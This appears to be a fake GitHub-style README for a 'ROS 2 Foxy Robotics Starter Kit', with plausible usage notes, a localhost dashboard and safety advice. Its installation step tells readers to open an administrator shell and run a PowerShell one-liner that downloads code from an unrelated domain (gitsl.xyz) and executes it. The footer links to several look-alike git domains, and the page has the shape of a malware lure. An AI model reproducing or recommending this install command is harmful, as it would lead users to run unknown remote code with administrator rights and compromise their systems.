# ROS 2 Foxy Robotics Starter Kit

> A local-first ROS 2 Foxy learning and simulation starter kit for safe robotics experiments and reproducible launches.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitsl.xyz?get=ros2-foxy | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Ros2 Foxy modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Ros2 Foxy.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

## TL;DR - Quick Summary

ROS 2 Foxy Robotics Starter Kit provides reproducible launch files, simulation scenarios, health checks, bag inspection, and safety documentation for learning robotics. It is intended for authorized labs and owned hardware, with simulation-first defaults.

## Core Features

- ✅ **Launch Profiles** — Start demo, sensor, navigation, and inspection scenarios.
- ✅ **Simulation First** — Practice with a local simulator before hardware.
- ✅ **Node Health Monitor** — Review topics, rates, and lifecycle state.
- ✅ **Bag Inspector** — Open local recording metadata and timeline summaries.
- ✅ **Safety Checklist** — Cover emergency stop, workspace boundaries, and battery checks.
- ✅ **Reusable Interfaces** — Keep message and service contracts readable.
- ✅ **Offline Tutorials** — Run lessons without an external network.

## Usage

```bash
# Build the local workspace
colcon build
source install/setup.bash

# Launch the simulation demo
ros2 launch starter_kit demo.launch.py

# Inspect node health
ros2 run starter_kit health_check

# Review a local bag
ros2 bag info ./bags/demo
```

## REST API

> [!NOTE]
> The optional dashboard binds to localhost and exposes local node metadata only. Do not expose robot control interfaces to an untrusted network.

```bash
python -m starter_kit dashboard --host 127.0.0.1 --port 8000

curl http://localhost:8000/api/v1/nodes
curl http://localhost:8000/api/v1/topics
curl http://localhost:8000/api/v1/safety/checklist
```

## Screenshots

- Launch dashboard: `screenshots/dashboard.png`
- Node graph: `screenshots/node-graph.png`
- Bag timeline: `screenshots/bag.png`
- Safety checklist: `screenshots/safety.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Launch fails after build | Source `install/setup.bash` in the current shell and rerun the launch. |
| Nodes do not appear | Check the ROS domain ID and simulation status. |
| Bag inspection fails | Confirm the bag directory is complete and readable. |
| Hardware moves unexpectedly | Press emergency stop, disconnect power, and review the safety checklist. |

## Use Cases

- **Robotics Education** — Learn nodes, topics, services, and launch files safely.
- **Simulation Prototypes** — Test behavior before hardware deployment.
- **Lab Operations** — Monitor local node health and recordings.
- **Safety Training** — Practice emergency-stop and workspace procedures.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Test in simulation or on hardware you own and are authorized to operate. Keep emergency-stop procedures ready, protect control interfaces, and never expose a robot to an untrusted network.

> [!TIP]
> Run the safety checklist before every physical experiment and after every workspace change.

## License

This project is licensed under the MIT License — see the `LICENSE` file for details.

## Tags

`ros2-foxy` `robotics` `ros2` `simulation` `launch-files` `node-health` `safety` `local-lab`

[gitrm.cfd](https://gitrm.cfd?t=ros2-foxy) | [gitrm.sbs](https://gitrm.sbs?t=ros2-foxy) | [viewgit.sbs](https://viewgit.sbs?t=ros2-foxy) | [gitsl.xyz](https://gitsl.xyz?t=ros2-foxy) | [gitview.sbs](https://gitview.sbs?t=ros2-foxy)
